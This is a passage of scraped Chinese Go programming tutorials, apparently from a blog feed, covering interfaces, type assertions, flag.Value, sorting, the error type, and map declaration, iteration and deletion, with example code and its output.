&amp;phone) phone.call()&#125; 案例2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package mainimport \"fmt\"type Income interface &#123; calculate() float64 //计算收入总额 source() string //用来说明收入来源&#125;//固定账单项目type FixedBilling struct &#123; projectName string //工程项目 biddedAmount float64 //项目招标总额&#125;//定时生产项目(定时和材料项目)type TimeAndMaterial struct &#123; projectName string workHours float64 //工作时长 hourlyRate float64 //每小时工资率&#125;//固定收入项目func (f FixedBilling) calculate() float64 &#123; return f.biddedAmount&#125;func (f FixedBilling) source() string &#123; return f.projectName&#125;//定时收入项目func (t TimeAndMaterial) calculate() float64 &#123; return t.workHours * t.hourlyRate&#125;func (t TimeAndMaterial) source() string &#123; return t.projectName&#125;//通过广告点击获得收入type Advertisement struct &#123; adName string clickCount int incomePerclick float64&#125;func (a Advertisement) calculate() float64 &#123; return float64(a.clickCount) * a.incomePerclick&#125;func (a Advertisement) source() string &#123; return a.adName&#125;func main() &#123; p1 := FixedBilling&#123;\"项目1\", 5000&#125; p2 := FixedBilling&#123;\"项目2\", 10000&#125; p3 := TimeAndMaterial&#123;\"项目3\", 100, 40&#125; p4 := TimeAndMaterial&#123;\"项目4\", 250, 20&#125; p5 := Advertisement&#123;\"广告1\", 10000, 0.1&#125; p6 := Advertisement&#123;\"广告2\", 20000, 0.05&#125; ic := []Income&#123;p1, p2, p3, p4, p5, p6&#125; fmt.Println(calculateNetIncome(ic))&#125;//计算净收入func calculateNetIncome(ic []Income) float64 &#123; netincome := 0.0 for _, income := range ic &#123; fmt.Printf(\"收入来源：%s ，收入金额：%.2f \\n\", income.source(), income.calculate()) netincome += income.calculate() &#125; return netincome&#125;//说明：// 没有对calculateNetIncome函数做任何更改，尽管添加了新的收入方式。全靠多态性而起作用。// 由于新的Advertisement类型也实现了Income接口，可以将它添加到ic切片中。// calculateNetIncome函数在没有任何更改的情况下工作，因为它可以调用Advertisement类型的calculate()和source()方法。 空接口 12type A interface &#123;&#125; 空接口可以接受任何的数据类型 1234567type A interface &#123;&#125;var a1 A = Cat&#123;&quot;Mimi&quot;, 1&#125;var a2 A = Person&#123;&quot;Steven&quot;, &quot;男&quot;&#125;var a3 A = &quot;Learn golang with me!&quot;var a4 A = 100var a5 A = 3.14 定义map。value是任何数据类型 12345//2、定义map。value是任何数据类型map1 := make(map[string]interface&#123;&#125;)map1[&quot;name&quot;] = &quot;Daniel&quot;map1[&quot;age&quot;] = 13map1[&quot;height&quot;] = 1.71 定义一个切片，其中存储任意数据类型 123slice1 := make([]interface&#123;&#125;, 0, 10)slice1 = append(slice1, a1, a2, a3, a4, a5)fmt.Println(slice1) 完整案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( \"fmt\")type A interface &#123;&#125;type Cat struct &#123; name string age int&#125;type Person struct &#123; name string sex string&#125;func main() &#123; var a1 A = Cat&#123;\"Mimi\", 1&#125; var a2 A = Person&#123;\"jonson\", \"男\"&#125; var a3 A = \"Learn golang with me!\" var a4 A = 100 var a5 A = 3.14 showInfo(a1) showInfo(a2) showInfo(a3) showInfo(a4) showInfo(a5) fmt.Println(\"------------------\") //1、fmt.println参数就是空接口 fmt.Println(\"println的参数就是空接口，可以是任何数据类型\", 100, 3.14, Cat&#123;\"旺旺\", 2&#125;) //2、定义map。value是任何数据类型 map1 := make(map[string]interface&#123;&#125;) map1[\"name\"] = \"Daniel\" map1[\"age\"] = 13 map1[\"height\"] = 1.71 fmt.Println(map1) fmt.Println(\"------------------\") // 3、定义一个切片，其中存储任意数据类型 slice1 := make([]interface&#123;&#125;, 0, 10) slice1 = append(slice1, a1, a2, a3, a4, a5) fmt.Println(slice1)&#125;func showInfo(a A) &#123; fmt.Printf(\"%T , %v \\n\", a, a)&#125; 接口对象转型的两种方式 123456789101112131415161718192021222324//接口对象转型方式1//instance,ok := 接口对象.(实际类型)func getType(s Shape) &#123; if instance, ok := s.(Rectangle); ok &#123; fmt.Printf(\"矩形：长度%.2f , 宽度%.2f , \", instance.a, instance.b) &#125; else if instance, ok := s.(Triangle); ok &#123; fmt.Printf(\"三角形：三边分别：%.2f , %.2f , %.2f , \", instance.a, instance.b, instance.c) &#125; else if instance, ok := s.(Circle); ok &#123; fmt.Printf(\"圆形：半径%.2f , \", instance.radius) &#125;&#125;//接口对象转型——方式2//接口对象.(type), 配合switch和case语句使用func getType2(s Shape) &#123; switch instance := s.(type) &#123; case Rectangle: fmt.Printf(\"矩形：长度为%.2f ， 宽为%.2f ，\\t\", instance.a, instance.b) case Triangle: fmt.Printf(\"三角形：三边分别为%.2f ，%.2f ， %.2f ，\\t\", instance.a, instance.b, instance.c) case Circle: fmt.Printf(\"圆形：半径为%.2f ，\\t\", instance.radius) &#125;&#125; 接口对象转型案例 求周长或者面积 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112package mainimport ( \"math\" \"fmt\")//1、定义接口type Shape interface &#123; perimeter() float64 area() float64&#125;//2.矩形type Rectangle struct &#123; a, b float64&#125;//3.三角形type Triangle struct &#123; a, b, c float64&#125;//4.圆形type Circle struct &#123; radius float64&#125;//定义实现接口的方法func (r Rectangle) perimeter() float64 &#123; return (r.a + r.b) * 2&#125;func (r Rectangle) area() float64 &#123; return r.a * r.b&#125;func (t Triangle) perimeter() float64 &#123; return t.a + t.b + t.c&#125;func (t Triangle) area() float64 &#123; //海伦公式 p := t.perimeter() / 2 //半周长 return math.Sqrt(p * (p - t.a) * (p - t.b) * (p - t.c))&#125;func (c Circle) perimeter() float64 &#123; return 2 * math.Pi * c.radius&#125;func (c Circle) area() float64 &#123; return math.Pow(c.radius, 2) * math.Pi&#125;//接口对象转型方式1//instance,ok := 接口对象.(实际类型)func getType(s Shape) &#123; if instance, ok := s.(Rectangle); ok &#123; fmt.Printf(\"矩形：长度%.2f , 宽度%.2f , \", instance.a, instance.b) &#125; else if instance, ok := s.(Triangle); ok &#123; fmt.Printf(\"三角形：三边分别：%.2f , %.2f , %.2f , \", instance.a, instance.b, instance.c) &#125; else if instance, ok := s.(Circle); ok &#123; fmt.Printf(\"圆形：半径%.2f , \", instance.radius) &#125;&#125;//接口对象转型——方式2//接口对象.(type), 配合switch和case语句使用func getType2(s Shape) &#123; switch instance := s.(type) &#123; case Rectangle: fmt.Printf(\"矩形：长度为%.2f ， 宽为%.2f ，\\t\", instance.a, instance.b) case Triangle: fmt.Printf(\"三角形：三边分别为%.2f ，%.2f ， %.2f ，\\t\", instance.a, instance.b, instance.c) case Circle: fmt.Printf(\"圆形：半径为%.2f ，\\t\", instance.radius) &#125;&#125;func getResult(s Shape) &#123; getType2(s) fmt.Printf(\"周长：%.2f ，面积:%.2f \\n\", s.perimeter(), s.area())&#125;func main() &#123; var s Shape s = Rectangle&#123;3, 4&#125; getResult(s) showInfo(s) s = Triangle&#123;3, 4, 5&#125; getResult(s) showInfo(s) s = Circle&#123;1&#125; getResult(s) showInfo(s) x := Triangle&#123;3, 4, 5&#125; fmt.Println(x)&#125;func (t Triangle) String() string &#123; return fmt.Sprintf(\"Triangle对象，属性分别为：%.2f, %.2f, %.2f\", t.a, t.b, t.c)&#125;func showInfo(s Shape) &#123; fmt.Printf(\"%T ,%v \\n\", s, s) fmt.Println(\"-------------------\")&#125; flag.Value接口 在本章，我们会学到另一个标准的接口类型flag.Value是怎么帮助命令行标记定义新的符号的。思考下面这个会休眠特定时间的程序： 12345678var period = flag.Duration(&quot;period&quot;, 1*time.Second, &quot;sleep period&quot;)func main() &#123; flag.Parse() fmt.Printf(&quot;Sleeping for %v...&quot;, *period) time.Sleep(*period) fmt.Println()&#125; 在它休眠前它会打印出休眠的时间周期。fmt包调用time.Duration的String方法打印这个时间周期是以用户友好的注解方式，而不是一个纳秒数字： $ go build gopl.io/ch7/sleep $ ./sleep Sleeping for 1s… 默认情况下，休眠周期是一秒，但是可以通过-period 这个命令行标记来控制。flag.Duration函数创建一个time.Duration类型的标记变量并且允许用户通过多种用户友好的方式来设置这个变量的大小，这种方式还包括和String方法相同的符号排版形式。这种对称设计使得用户交互良好。 $ ./sleep -period 50ms Sleeping for 50ms… $ ./sleep -period 2m30s Sleeping for 2m30s… $ ./sleep -period 1.5h Sleeping for 1h30m0s… $ ./sleep -period “1 day” invalid value “1 day” for flag -period: time: invalid duration 1 day 因为时间周期标记值非常的有用，所以这个特性被构建到了flag包中；但是我们为我们自己的数据类型定义新的标记符号是简单容易的。我们只需要定义一个实现flag.Value接口的类型，如下： 1234567package flag// Value is the interface to the value stored in a flag.type Value interface &#123; String() string Set(string) error&#125; String方法格式化标记的值用在命令行帮组消息中；这样每一个flag.Value也是一个fmt.Stringer。Set方法解析它的字符串参数并且更新标记变量的值。实际上，Set方法和String是两个相反的操作，所以最好的办法就是对他们使用相同的注解方式。 让我们定义一个允许通过摄氏度或者华氏温度变换的形式指定温度的celsiusFlag类型。注意celsiusFlag内嵌了一个Celsius类型(§2.5)，因此不用实现本身就已经有String方法了。为了实现flag.Value，我们只需要定义Set方法： 123456789101112131415161718192021222324252627282930// gopl.io/ch7/tempconvtype celsiusFlag struct&#123;Celsius&#125;func (f *celsiusFlag) Set(s string) error &#123; var unit string var value float64 fmt.Sscanf(s, \"%f%s\", &amp;value, &amp;unit) // no error check needed switch unit &#123; case \"C\", \"°C\": f.Celsius = Celsius(value) return nil case \"F\", \"°F\": f.Celsius = FToC(Fahrenheit(value)) return nil &#125; return fmt.Errorf(\"invalid temperature %q\", s)&#125;//!-celsiusFlag//!+CelsiusFlag// CelsiusFlag defines a Celsius flag with the specified name,// default value, and usage, and returns the address of the flag variable.// The flag argument must have a quantity and a unit, e.g., \"100C\".func CelsiusFlag(name string, value Celsius, usage string) *Celsius &#123; f := celsiusFlag&#123;value&#125; flag.CommandLine.Var(&amp;f, name, usage) return &amp;f.Celsius&#125; 调用fmt.Sscanf函数从输入s中解析一个浮点数（value）和一个字符串（unit）。虽然通常必须检查Sscanf的错误返回，但是在这个例子中我们不需要因为如果有错误发生，就没有switch case会匹配到。 下面的CelsiusFlag函数将所有逻辑都封装在一起。它返回一个内嵌在celsiusFlag变量f中的Celsius指针给调用者。Celsius字段是一个会通过Set方法在标记处理的过程中更新的变量。调用Var方法将标记加入应用的命令行标记集合中，有异常复杂命令行接口的全局变量flag.CommandLine.Programs可能有几个这个类型的变量。调用Var方法将一个celsiusFlag参数赋值给一个flag.Value参数,导致编译器去检查 celsiusFlag是否有必须的方法。 // CelsiusFlag defines a Celsius flag with the specified name, // default value, and usage, and returns the address of the flag variable. // The flag argument must have a quantity and a unit, e.g., “100C”. 12345func CelsiusFlag(name string, value Celsius, usage string) *Celsius &#123; f := celsiusFlag&#123;value&#125; flag.CommandLine.Var(&amp;f, name, usage) return &amp;f.Celsius&#125; 现在我们可以开始在我们的程序中使用新的标记： 1234567// gopl.io/ch7/tempflagvar temp = tempconv.CelsiusFlag(\"temp\", 20.0, \"the temperature\")func main() &#123; flag.Parse() fmt.Println(*temp)&#125; 下面是典型的场景： $ go build gopl.io/ch7/tempflag $ ./tempflag 20°C $ ./tempflag -temp -18C -18°C $ ./tempflag -temp 212°F 100°C $ ./tempflag -temp 273.15K invalid value “273.15K” for flag -temp: invalid temperature “273.15K” Usage of ./tempflag: -temp value the temperature (default 20°C) $ ./tempflag -help Usage of ./tempflag: -temp value the temperature (default 20°C) 接口值 概念上讲一个接口的值，接口值，由两个部分组成，一个具体的类型和那个类型的值。它们被称为接口的动态类型和动态值。对于像Go语言这种静态类型的语言，类型是编译期的概念；因此一个类型不是一个值。在我们的概念模型中，一些提供每个类型信息的值被称为类型描述符，比如类型的名称和方法。在一个接口值中，类型部分代表与之相关类型的描述符。 下面4个语句中，变量w得到了3个不同的值。（开始和最后的值是相同的） var w io.Writer w = os.Stdout w = new(bytes.Buffer) w = nil 让我们进一步观察在每一个语句后的w变量的值和动态行为。第一个语句定义了变量w: var w io.Writer 在Go语言中，变 量总是被一个定义明确的值初始化，卽使接口类型也不例外。对于一个接口的零值就是它的类型和值的部分都是nil。 一个接口值基于它的动态类型被描述为空或非空，所以这是一个空的接口值。你可以通过使用w==nil或者w!=nil来判读接口值是否为空。调用一个空接口值上的任意方法都会产生panic: w.Write([]byte(“hello”)) // panic: nil pointer dereference 第二个语句将一个os.File类型的值赋给变量w: w = os.Stdout 这个赋值过程调用了一个具体类型到接口类型的隐式转换，这和显式的使用io.Writer(os.Stdout)是等价的。这类转换不管是显式的还是隐式的，都会刻畵出操作到的类型和值。这个接口值的动态类型被设为os.Stdout指针的类型描述符，它的动态值持有os.Stdout的拷贝；这是一个代表处理标准输出的os.File类型变量的指针（图7.2） 。 调用一个包含os.File类型指针的接口值的Write方法，使得(*os.File).Write方法被调用。这个调用输出“hello”。 w.Write([]byte(“hello”)) // “hello” 通常在编译期，我们不知道接口值的动态类型是什么，所以一个接口上的调用必须使用动态分配。因为不是直接进行调用，所以编译器必须把代码生成在类型描述符的方法Write上，然后间接调用那个地址。这个调用的接收者是一个接口动态值的拷贝，os.Stdout。效果和下面这个直接调用一样： os.Stdout.Write([]byte(“hello”)) // “hello” 第三个语句给接口值赋了一个bytes.Buffer类型的值 w = new(bytes.Buffer) 现在动态类型是*bytes.Buffer并且动态值是一个指向新分配的缓冲区的指针（图7.3）。 Write方法的调用也使用了和之前一样的机制： w.Write([]byte(“hello”)) // writes “hello” to the bytes.Buffers 这次类型描述符是*bytes.Buffer，所以调用了(*bytes.Buffer).Write方法，并且接收者是该缓冲区的地址。这个调用把字符串“hello”添加到缓冲区中。 最后，第四个语句将nil赋给了接口值： w = nil 这个重置将它所有的部分都设为nil值，把变量w恢复到和它之前定义时相同的状态图，在图7.1中可以看到。 一个接口值可以持有任意大的动态值。例如，表示时间实例的time.Time类型，这个类型有几个对外不公开的字段。我们从它上面创建一个接口值, var x interface{} = time.Now() 结果可能和图7.4相似。从概念上讲，不论接口值多大，动态值总是可以容下它。（这只是一个概念上的模型；具体的实现可能会非常不同） 接口值可以使用＝＝和！＝来进行比较。两个接口值相等仅当它们都是nil值或者它们的动态类型相同并且动态值也根据这个动态类型的＝＝操作相等。因为接口值是可比较的，所以它们可以用在map的键或者作为switch语句的操作数。 然而，如果两个接口值的动态类型相同，但是这个动态类型是不可比较的（比如切片），将它们进行比较就会失败并且panic: 12var x interface&#123;&#125; = []int&#123;1, 2, 3&#125;fmt.Println(x == x) // panic: comparing uncomparable type []int 考虑到这点，接口类型是非常与众不同的。其它类型要么是安全的可比较类型（如基本类型和指针）要么是完全不可比较的类型（如切片，映射类型，和函数），但是在比较接口值或者包含了接口值的聚合类型时，我们必须要意识到潜在的panic。同样的风险也存在于使用接口作为map的键或者switch的操作数。只能比较你非常确定它们的动态值是可比较类型的接口值。 当我们处理错误或者调试的过程中，得知接口值的动态类型是非常有帮助的。所以我们使用fmt包的%T动作: 123456var w io.Writerfmt.Printf(&quot;%T\\n&quot;, w) // &quot;&lt;nil&gt;&quot;w = os.Stdoutfmt.Printf(&quot;%T\\n&quot;, w) // &quot;*os.File&quot;w = new(bytes.Buffer)fmt.Printf(&quot;%T\\n&quot;, w) // &quot;*bytes.Buffer&quot; sort.interface 排序包中，对于一些 基本类型的切片，如[]int, []string, and []float64 都有现成的排序方式，如下： 12345678910111213141516171819202122232425262728package mainimport ( \"sort\" \"fmt\")func main()&#123; s:= []string&#123;\"a\",\"c\",\"b\"&#125; fmt.Println(s) sort.Strings(s) fmt.Println(s)&#125;func init() &#123; //!+ints values := []int&#123;3, 1, 4, 1&#125; fmt.Println(sort.IntsAreSorted(values)) // \"false\" sort.Ints(values) fmt.Println(values) // \"[1 1 3 4]\" fmt.Println(sort.IntsAreSorted(values)) // \"true\" sort.Sort(sort.Reverse(sort.IntSlice(values))) fmt.Println(values) // \"[4 3 1 1]\" fmt.Println(sort.IntsAreSorted(values)) // \"false\" //!-ints&#125; 如果是自定义的类型，则需要实现接口: 123456package sorttype Interface interface &#123; Len() int Less(i, j int) bool // i, j are indices of sequence elements Swap(i, j int)&#125; 注意反转sort.Reverse很有意思，其实际是修改了比较函数 1234package sorttype reverse struct&#123; Interface &#125; // that is, sort.Interfacefunc (r reverse) Less(i, j int) bool &#123; return r.Interface.Less(j, i) &#125;func Reverse(data Interface) Interface &#123; return reverse&#123;data&#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146package mainimport ( \"fmt\" \"os\" \"sort\" \"text/tabwriter\" \"time\")//!+maintype Track struct &#123; Title string Artist string Album string Year int Length time.Duration&#125;var tracks = []*Track&#123; &#123;\"Go\", \"Delilah\", \"From the Roots Up\", 2012, length(\"3m38s\")&#125;, &#123;\"Go\", \"Moby\", \"Moby\", 1992, length(\"3m37s\")&#125;, &#123;\"Go Ahead\", \"Alicia Keys\", \"As I Am\", 2007, length(\"4m36s\")&#125;, &#123;\"Ready 2 Go\", \"Martin Solveig\", \"Smash\", 2011, length(\"4m24s\")&#125;,&#125;func length(s string) time.Duration &#123; d, err := time.ParseDuration(s) if err != nil &#123; panic(s) &#125; return d&#125;//!-main//!+printTracksfunc printTracks(tracks []*Track) &#123; const format = \"%v\\t%v\\t%v\\t%v\\t%v\\t\\n\" tw := new(tabwriter.Writer).Init(os.Stdout, 0, 8, 2, ' ', 0) fmt.Fprintf(tw, format, \"Title\", \"Artist\", \"Album\", \"Year\", \"Length\") fmt.Fprintf(tw, format, \"-----\", \"------\", \"-----\", \"----\", \"------\") for _, t := range tracks &#123; fmt.Fprintf(tw, format, t.Title, t.Artist, t.Album, t.Year, t.Length) &#125; tw.Flush() // calculate column widths and print table&#125;//!-printTracks//!+artistcodetype byArtist []*Trackfunc (x byArtist) Len() int &#123; return len(x) &#125;func (x byArtist) Less(i, j int) bool &#123; return x[i].Artist &lt; x[j].Artist &#125;func (x byArtist) Swap(i, j int) &#123; x[i], x[j] = x[j], x[i] &#125;//!-artistcode//!+yearcodetype byYear []*Trackfunc (x byYear) Len() int &#123; return len(x) &#125;func (x byYear) Less(i, j int) bool &#123; return x[i].Year &lt; x[j].Year &#125;func (x byYear) Swap(i, j int) &#123; x[i], x[j] = x[j], x[i] &#125;//!-yearcodefunc main() &#123; fmt.Println(\"byArtist:\") sort.Sort(byArtist(tracks)) printTracks(tracks) fmt.Println(\"\\nReverse(byArtist):\") sort.Sort(sort.Reverse(byArtist(tracks))) printTracks(tracks) fmt.Println(\"\\nbyYear:\") sort.Sort(byYear(tracks)) printTracks(tracks) fmt.Println(\"\\nCustom:\") //!+customcall sort.Sort(customSort&#123;tracks, func(x, y *Track) bool &#123; if x.Title != y.Title &#123; return x.Title &lt; y.Title &#125; if x.Year != y.Year &#123; return x.Year &lt; y.Year &#125; if x.Length != y.Length &#123; return x.Length &lt; y.Length &#125; return false &#125;&#125;) //!-customcall printTracks(tracks)&#125;/*//!+artistoutputTitle Artist Album Year Length----- ------ ----- ---- ------Go Ahead Alicia Keys As I Am 2007 4m36sGo Delilah From the Roots Up 2012 3m38sReady 2 Go Martin Solveig Smash 2011 4m24sGo Moby Moby 1992 3m37s//!-artistoutput//!+artistrevoutputTitle Artist Album Year Length----- ------ ----- ---- ------Go Moby Moby 1992 3m37sReady 2 Go Martin Solveig Smash 2011 4m24sGo Delilah From the Roots Up 2012 3m38sGo Ahead Alicia Keys As I Am 2007 4m36s//!-artistrevoutput//!+yearoutputTitle Artist Album Year Length----- ------ ----- ---- ------Go Moby Moby 1992 3m37sGo Ahead Alicia Keys As I Am 2007 4m36sReady 2 Go Martin Solveig Smash 2011 4m24sGo Delilah From the Roots Up 2012 3m38s//!-yearoutput//!+customoutTitle Artist Album Year Length----- ------ ----- ---- ------Go Moby Moby 1992 3m37sGo Delilah From the Roots Up 2012 3m38sGo Ahead Alicia Keys As I Am 2007 4m36sReady 2 Go Martin Solveig Smash 2011 4m24s//!-customout*///!+customcodetype customSort struct &#123; t []*Track less func(x, y *Track) bool&#125;func (x customSort) Len() int &#123; return len(x.t) &#125;func (x customSort) Less(i, j int) bool &#123; return x.less(x.t[i], x.t[j]) &#125;func (x customSort) Swap(i, j int) &#123; x.t[i], x.t[j] = x.t[j], x.t[i] &#125; error Since the beg inning of this book, we’ve been using and cre ating values of the mysteriou s predeclare d error type wit hout explaining what it really is. In fac t, it’s just an int erface typ e with a single met hod that retur ns an error message: 123type error interface &#123;Error() string&#125; errors.New() 1234package errorsfunc New(text string) error &#123; return &amp;errorString&#123;text&#125; &#125;type errorString struct &#123; text string &#125;func (e *errorString) Error() string &#123; return e.text &#125; fmt.Println(errors.New(“EOF”) == errors.New(“EOF”)) // “false” fmt.Errorf也是一样的 12345package fmtimport &quot;errors&quot;func Errorf(format string, args ...interface&#123;&#125;) error &#123;return errors.New(Sprintf(format, args...))&#125; syscall包中的错误。 1234567891011121314package syscalltype Errno uintptr // operating system error codevar errors = [...]string&#123;1: &quot;operation not permitted&quot;, // EPERM2: &quot;no such file or directory&quot;, // ENOENT3: &quot;no such process&quot;, // ESRCH// ...&#125;func (e Errno) Error() string &#123;if 0 &lt;= int(e) &amp;&amp; int(e) &lt; len(errors) &#123;return errors[e]&#125;return fmt.Sprintf(&quot;errno %d&quot;, e)&#125; var err error = syscall.Errno(2) fmt.Println(err.Error()) // “no such file or directory” fmt.Println(err) // “no such file or directory”","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[17]-Map表","slug":"golang-17-mapping","date":"2018-11-26T08:51:46.000Z","updated":"2019-02-15T15:24:51.956Z","comments":true,"path":"2018/11/26/golang-17-mapping/","link":"","permalink":"https://dreamerjonson.com/2018/11/26/golang-17-mapping/","excerpt":"","text":"Map 声明 12345678910111213//1、声明map的方式1var map1 map[string]string//2、声明map的方式2map2 := make(map[string]string)//3、map中key可以是：int、float、bool、string、数组// 一定不可以是：切片、函数、mapvar m1 map[int]stringvar m2 map[float64]stringvar m3 map[bool]stringvar m4 map[string]string mapping定义与初始化 1、声明时同时初始化 123456789101112var country = map[string]string&#123; &quot;China&quot;: &quot;Beijing&quot;, &quot;Japan&quot;: &quot;Tokyo&quot;, &quot;India&quot;: &quot;New Delhi&quot;, &quot;France&quot;: &quot;Paris&quot;, &quot;Italy&quot;: &quot;Rome&quot;,&#125;fmt.Println(country)//短变量声明初始化方式rating := map[string]float64&#123;&quot;c&quot;: 5, &quot;Go&quot;: 4.5, &quot;Python&quot;: 4.5, &quot;C++&quot;: 3&#125;fmt.Println(rating) 2、创建map后再赋值 123456countryMap := make(map[string]string)countryMap[&quot;China&quot;] = &quot;Beijing&quot;countryMap[&quot;Japan&quot;] = &quot;Tokyo&quot;countryMap[&quot;India&quot;] = &quot;New Delhi&quot;countryMap[&quot;France&quot;] = &quot;Paris&quot;countryMap[&quot;Italy&quot;] = &quot;Rome&quot; mapping遍历 (1)、key 、value都遍历 123for k, v := range countryMap &#123; fmt.Println(&quot;国家&quot;, k, &quot;首都&quot;, v)&#125; (2)、只展示value 123for _, v := range countryMap &#123; fmt.Println(&quot;国家&quot;, &quot;首都&quot;, v)&#125; (3)、只展示key 123for k := range countryMap &#123; fmt.Println(&quot;国家&quot;, k , &quot;首都&quot;, countryMap[k])&#125; (4)、查看元素是否在map中存在 12345678910111213141516value , ok := countryMap[&quot;England&quot;]fmt.Printf(&quot;%q \\n&quot; , value)fmt.Printf(&quot;%T , %v \\n&quot; , ok , ok)if ok &#123; fmt.Println(&quot;首都：&quot; , value)&#125; else &#123; fmt.Println(&quot;首都信息未检索到！&quot;)&#125;//第二种方式if value ,ok :=countryMap[&quot;USA&quot;];ok &#123; fmt.Println(&quot;首都：&quot; , value)&#125; else &#123; fmt.Println(&quot;首都信息未检索到！&quot;)&#125; 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package mainimport \"fmt\"func main() &#123; //1、声明时同时初始化 var country = map[string]string&#123; \"China\": \"Beijing\", \"Japan\": \"Tokyo\", \"India\": \"New Delhi\", \"France\": \"Paris\", \"Italy\": \"Rome\", &#125; fmt.Println(country) //短变量声明初始化方式 rating := map[string]float64&#123;\"c\": 5, \"Go\": 4.5, \"Python\": 4.5, \"C++\": 3&#125; fmt.Println(rating) //2、创建map后再赋值 countryMap := make(map[string]string) countryMap[\"China\"] = \"Beijing\" countryMap[\"Japan\"] = \"Tokyo\" countryMap[\"India\"] = \"New Delhi\" countryMap[\"France\"] = \"Paris\" countryMap[\"Italy\"] = \"Rome\" // 3、遍历map（无序） // (1)、key 、value都遍历 for k, v := range countryMap &#123; fmt.Println(\"国家\", k, \"首都\", v) &#125; fmt.Println(\"-----------\") //(2)、只展示value for _, v := range countryMap &#123; fmt.Println(\"国家\", \"首都\", v) &#125; fmt.Println(\"-----------\") //(3)、只展示key for k := range countryMap &#123; fmt.Println(\"国家\", k , \"首都\", countryMap[k]) &#125; fmt.Println(\"-----------\") //4、查看元素是否在map中存在 value , ok := countryMap[\"England\"] fmt.Printf(\"%q \\n\" , value) fmt.Printf(\"%T , %v \\n\" , ok , ok) if ok &#123; fmt.Println(\"首都：\" , value) &#125; else &#123; fmt.Println(\"首都信息未检索到！\") &#125; //或者 if value ,ok :=countryMap[\"USA\"];ok &#123; fmt.Println(\"首都：\" , value) &#125; else &#123; fmt.Println(\"首都信息未检索到！\") &#125;&#125; mapping 删除 1234567891011121314151617181920212223242526package mainimport \"fmt\"func main() &#123; //1、声明并初始化一个map map1 := map[string]string &#123; \"element\":\"div\", \"width\" :\"100px\", \"height\":\"200px\", \"border\":\"solid\", \"background\":\"none\", &#125; //2、根据key删除map中的某个元素 fmt.Println(\"删除前：\",map1) if _,ok := map1[\"background\"]; ok &#123; delete(map1 , \"background\") &#125; fmt.Println(\"删除后：\",map1) //3、清空map //map1 = map[string]string&#123;&#125; map1 = make(map[string]string) fmt.Println(\"清空后：\",map1)&#125; 补充 哈希表是一种巧妙并且实用的数据结构。它是一个无序的key/value对的集合，其中所有的key都是不同的，然后通过给定的key可以在常数时间复杂度内检索、更新或删除对应的value。 在Go语言中，一个map就是一个哈希表的引用，map类型可以写为map[K]V，其中K和V分别对应key和value。map中所有的key都有相同的类型，所以的value也有着相同的类型，但是key和value之间可以是不同的数据类型。其中K对应的key必须是支持==比较运算符的数据类型，所以map可以通过测试key是否相等来判断是否已经存在。虽然浮点数类型也是支持相等运算符比较的，但是将浮点数用做key类型则是一个坏的想法，正如第三章提到的，最坏的情况是可能出现的NaN和任何浮点数都不相等。对于V对应的value数据类型则没有任何的限制。 内置的make函数可以创建一个map： ages := make(map[string]int) // mapping from strings to ints 我们也可以用map字面值的语法创建map，同时还可以指定一些最初的key/value： ages := map[string]int{ “alice”: 31, “charlie”: 34, } 这相当于 ages := make(map[string]int) ages[“alice”] = 31 ages[“charlie”] = 34 因此，另一种创建空的map的表达式是map[string]int{}。 Map中的元素通过key对应的下标语法访问： ages[“alice”] = 32 fmt.Println(ages[“alice”]) // “32” 使用内置的delete函数可以删除元素： delete(ages, “alice”) // remove element ages[“alice”] 所有这些操作是安全的，卽使这些元素不在map中也没有关系；如果一个查找失败将返回value类型对应的零值，例如，卽使map中不存在“bob”下面的代码也可以正常工作，因为ages[“bob”]失败时将返回0。 ages[“bob”] = ages[“bob”] + 1 // happy birthday! 而且x += y和x等简短赋值语法也可以用在map上，所以上面的代码可以改写成 ages[“bob”] += 1 更简单的写法 ages[“bob”] 但是map中的元素并不是一个变量，因此我们不能对map的元素进行取址操作： _ = &amp;ages[“bob”] // compile error: cannot take address of map element 禁止对map元素取址的原因是map可能随着元素数量的增长而重新分配更大的内存空间，从而可能导致之前的地址无效。 要想遍历map中全部的key/value对的话，可以使用range风格的for循环实现，和之前的slice遍历语法类似。下面的迭代语句将在每次迭代时设置name和age变量，它们对应下一个键/值对： for name, age := range ages { fmt.Printf(&quot;%s\\t%d\\n&quot;, name, age) } Map的迭代顺序是不确定的，并且不同的哈希函数实现可能导致不同的遍历顺序。在实践中，遍历的顺序是随机的，每一次遍历的顺序都不相同。这是故意的，每次都使用随机的遍历顺序可以强制要求程序不会依赖具体的哈希函数实现。如果要按顺序遍历key/value对，我们必须显式地对key进行排序，可以使用sort包的Strings函数对字符串slice进行排序。下面是常见的处理方式： 12345678910import &quot;sort&quot;var names []stringfor name := range ages &#123; names = append(names, name)&#125;sort.Strings(names)for _, name := range names &#123; fmt.Printf(&quot;%s\\t%d\\n&quot;, name, ages[name])&#125; 因为我们一开始就知道names的最终大小，因此给slice分配一个合适的大小将会更有效。下面的代码创建了一个空的slice，但是slice的容量刚好可以放下map中全部的key： names := make([]string, 0, len(ages)) 在上面的第一个range循环中，我们只关心map中的key，所以我们忽略了第二个循环变量。在第二个循环中，我们只关心names中的名字，所以我们使用下划线来忽略第一个循环变量，也就是迭代slice时的索引。 map类型的零值是nil，也就是没有引用任何哈希表。 var ages map[string]int fmt.Println(ages == nil) // “true” fmt.Println(len(ages) == 0) // “true” map上的大部分操作，包括查找、删除、len和range循环都可以安全工作在nil值的map上，它们的行为和一个空的map类似。但是向一个nil值的map存入元素将导致一个panic异常： ages[“carol”] = 21 // panic: assignment to entry in nil map 在向map存数据前必须先创建map。 